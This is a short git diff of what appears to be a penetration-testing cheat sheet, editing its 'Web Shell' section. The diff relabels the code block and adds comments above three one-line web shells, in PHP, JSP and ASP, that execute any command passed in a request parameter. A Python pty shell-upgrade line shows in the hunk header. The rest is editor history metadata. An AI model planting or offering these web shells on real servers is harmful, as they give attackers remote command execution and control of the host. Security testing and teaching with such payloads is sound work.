@@ -118,17 +118,20 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 ## Web Shell
 
-```php
+```bash 
+# php
 <?php system($_REQUEST["cmd"]); ?>
+# jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+# asp
 <% eval request("cmd") %>
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTE5MzgxMjE4MSwtOTI4NzcwNTU1LDE4OT
-c5Mjg1MTYsLTExMTgyMjA0MzMsMTEzNTA1MjY4NCwtMTE3OTc1
-MTIxNSwtMTk2NDk0Mzg4OCwxNDYyMTUxOTMsNjgxMzMxNzQ5LD
-kyMjI0NTUwNywxNDE2NTk5MDcyLC01NzI4NDgwNDEsMTUzNTIz
-NDk2MSw0MDg0Mjg5ODUsLTE0NzQyMDM2MjksLTEwMDEzNzAwND
-IsLTE1OTM5MDQyMzIsNjgyNzAyNjU4LC01NzgzMjExOTAsODEx
-MDY5MDE1XX0=
+eyJoaXN0b3J5IjpbLTE4MDY2MTA4NDUsLTkyODc3MDU1NSwxOD
+k3OTI4NTE2LC0xMTE4MjIwNDMzLDExMzUwNTI2ODQsLTExNzk3
+NTEyMTUsLTE5NjQ5NDM4ODgsMTQ2MjE1MTkzLDY4MTMzMTc0OS
+w5MjIyNDU1MDcsMTQxNjU5OTA3MiwtNTcyODQ4MDQxLDE1MzUy
+MzQ5NjEsNDA4NDI4OTg1LC0xNDc0MjAzNjI5LC0xMDAxMzcwMD
+QyLC0xNTkzOTA0MjMyLDY4MjcwMjY1OCwtNTc4MzIxMTkwLDgx
+MTA2OTAxNV19
 -->
